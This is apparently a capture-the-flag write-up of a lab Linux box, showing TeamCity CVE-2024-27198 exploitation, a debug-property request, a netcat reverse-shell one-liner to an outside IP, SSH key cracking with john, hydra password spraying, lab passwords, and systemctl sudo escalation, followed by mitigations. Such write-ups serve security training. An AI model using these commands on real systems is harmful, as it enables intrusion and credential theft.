## Introduction

On this intermediate-level PG Practice Linux box, I identified a **vulnerable TeamCity instance**. After **enabling debug mode**, I exploited it to gain a reverse shell. While enumerating, I discovered a **private SSH key** inside the TeamCity instance and used it for lateral movement. Further inspection of `/var/mail` and user home directories revealed **plaintext passwords**. Finally, I leveraged a **`systemctl` sudo privilege** to escalate privileges and obtain a **root shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

### Port 25

Version - Postfix smtpd

## Web

### Port 80

Version - nginx 1.18.0 (Ubuntu)

I am gonna add the domain to `/etc/hosts` file:

![image.png](image%202.png)

I tried to login and found a subdomain to the domain:

I found TeamCity login panel, I searhed for public exploits avaibale for this build version:

![image.png](image%203.png)

## Exploitation

I used the following [PoC](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/51884&ved=2ahUKEwiPzfm10tyNAxW96wIHHWMMOiUQFnoECBoQAQ&usg=AOvVaw3CKDHo_hw3qr0Ks6u5-FvM) but this didn’t work.

I used [NVD-CVE-2023-42793](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://nvd.nist.gov/vuln/detail/cve-2023-42793&ved=2ahUKEwjKs5i-09yNAxUpgf0HHcFBH00QFnoECAoQAQ&usg=AOvVaw0MXs8ELn6v6_ddLhIG1da6) but it mentions `In JetBrains TeamCity before 2023.05.4 authentication bypass leading to RCE on TeamCity Server was possible`.

I shifted [ND-CVE-2024-27198](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://nvd.nist.gov/vuln/detail/cve-2024-27199&ved=2ahUKEwjO6bmz09yNAxVy_gIHHYvgHUwQFnoECAkQAQ&usg=AOvVaw0oPr1ncdffmfB3E6Bzzk5l) `In JetBrains TeamCity before 2023.11.4 path traversal allowing to perform limited admin actions was possible.` this is more likely to work, as our program is already version `2023.05.4`

I gonna try this github [code](https://github.com/Stuub/RCity-CVE-2024-27198.git)

It seems like worked but trying to execute commands returns the following error:

`Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via "rest.debug.processes.enable" internal property
Invalid request. Please check the request URL and data are correct`

```bash
python3 RCity.py -t http://teams.onlyrands.com -c id
```

![image.png](image%204.png)

Using the credentials I was able to login.

![image.png](image%205.png)

From the error we can understand that `debug` feature should be enabled on the remote system, but for our case it is not enabled, so I am gonna try to find a way to enable it.

I found 0xdf has solved similar box called Runner

`http://…/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true`

I captured:

![image.png](image%206.png)

Then I changed the request method:

![image.png](image%207.png)

and I changed CSRF token header to returned value:

![image.png](image%208.png)

Now the exploit worked:

![image.png](image%209.png)

I am gonna try to get a reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.214 80 >/tmp/f
```

![image.png](image%2010.png)

![image.png](image%2011.png)

Let’s try to make it interactive using python;

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Shell as git

There 4 bare git repositories in freelancers directory.

I cloned all of them to `temp` directory making them non-bare but couldn’t find anything in appreared files, they contain just files with no important information.

```bash
git clone file:///srv/git/freelancers/patriciam.git
```

But now we can also check commit logs and see what changes happened.

```bash
git status
git log
git show <commit>
```

Checking `marcot` commit log I found one interesting commit:

![image.png](image%2012.png)

```bash
git show 856f7c45f504b8f37593a2fff99c59e00a601e6e
```

Shows private SSH key.

As terminal is not fully functional and it returns the key in bad format I am gonna redirect it to file and polish it there.

```bash
git show 856f7c45f504b8f37593a2fff99c59e00a601e6e > file
```

![image.png](image%2013.png)

Something is wrong despite I made improvements, I am gonna try to obtained  private key from TeamCity portal.

![image.png](image%2014.png)

![image.png](image%2015.png)

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image.png](image%2016.png)

After entering it, I got access.

![image.png](image%2017.png)

It turns out passphrase also a password for marcot.

## Shell as marcot

I did password spraying on users:

```bash
cat /etc/passwd | grep sh$ | cut -d ':' -f 1

hydra -L users -p cheer $IP ssh
```

Nothing new.

As port 25 is open I am gonna check its root directory `/var/mail`.

Grepping for password I see the password in cleartext:

![image.png](image%2018.png)

I performed password spraying :

```bash
hydra -L users -p IdealismEngineAshen476 $IP ssh
```

![image.png](image%2019.png)

## Shell as matthewa

I found an unusual file under `mattewa` user home directory 

![image.png](image%2020.png)

```
Dach's password is "RefriedScabbedWasting502". 
I saw it once when he had to use my terminal to check TeamCity's status.
```

```bash
hydra -L users -p RefriedScabbedWasting502 $IP ssh
```

![image.png](image%2021.png)

## Shell as briand

![image.png](image%2022.png)

I am in an `administration` group that means high probability we can run something as root;

![image.png](image%2023.png)

We can just execute the command and use `!sh` inside of a new window acccording to [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#sudo)

![image.png](image%2024.png)

Now we are root!

## Credentials

```bash
marcot : cheer
matthewa : IdealismEngineAshen476
briand : RefriedScabbedWasting502
```

## Mitigation

- Restrict access to debug interfaces in production and disable debug mode.
- Secure sensitive files like SSH keys and avoid storing credentials in plaintext.
- Regularly audit `/var/mail` and home directories for sensitive data exposure.
- Restrict `sudo` permissions to essential binaries only.
- Keep TeamCity and all services up to date with security patches.
